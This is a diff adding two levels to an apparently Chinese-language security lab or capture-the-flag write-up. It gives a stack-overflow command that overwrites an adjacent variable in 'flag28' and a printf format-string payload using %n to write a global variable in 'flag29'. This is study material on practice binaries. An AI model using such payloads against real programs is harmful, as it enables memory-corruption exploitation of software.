@@ -370,6 +370,24 @@ print nopsled + "FAKE" + ret + system + "FAKE" + system_argv
 
 
 ### level 28
+程序没有SUID权限，因此只给出思路
+在定义时，buffer和target连在一起，因此用buffer输入覆盖掉target
+命令：
+`./flag28 $(python -c 'print "a"*64+"\xef\xbe\xad\xde"')`
+正常情况下可得到flag
+
+### level 29
+
+format-string-overflow-%n
+
+根据题意，利用printf漏洞覆盖掉全局变量target，首先通过gdb反汇编找到target地址，然后才取如下格式：
+`python -c "print 'AAAA'+'\x48\xa0\x04\x08'+'B'*x+'%x'*y+'%n'"
+通过调试先确定y，使%n对应target位置
+再调整x，使得target为64
+命令为：
+`python -c "print 'AAAA'+'\x48\xa0\x04\x08'+'B'*29+'%x'*4 + '%n'"|./flag29`
+得到flag
+![](img/level29.png)
 
 ## 三、 实验结果
 
